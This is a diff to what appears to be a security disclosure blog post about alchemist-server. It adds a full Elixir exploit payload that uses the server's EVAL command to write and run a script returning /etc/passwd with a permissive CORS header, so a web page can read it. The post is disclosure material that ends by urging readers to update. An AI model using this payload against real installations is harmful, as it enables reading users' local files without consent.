@@ -99,9 +99,30 @@ The browser will now see this as a response to its XHR request.
 
 # Boom
 
-And that's what I did.
+And here's the full payload
 
-<video src="/videos/alchemist_server.webm" width="640" height="360" onclick="this.play()">
+```elixir
+# Write the following script to /tmp/payload
+EVAL File.write!("/tmp/payload",
+  # HTTP response header
+  ~S|IO.puts "HTTP/1.1 200 OK"
+  # \n - encoded in a way that won't be parsed as a new line
+  <> List.to_string([10])
+  # CORS header
+  <> "Access-Control-Allow-Origin: *"
+  # \r\n\r\n - see above
+  <> List.to_string([13,10,13,10])
+  # Insert the contents of /etc/passwrd
+  <> File.read!(Path.expand(~s(/etc/passwd)))
+  # \r\n\r\n - see above
+  <> List.to_string([13,10,13,10])|);
+  # Execute the above script and return the result
+{:eval, "/tmp/payload"}
+```
+
+This is what it looks like when wrapped in HTML/Javascript:
+
+<video src="/videos/alchemist_server.webm" width="640" height="360" controls>
 </video>
 
 Thanks for reading, and make sure you update your alchemist-server!
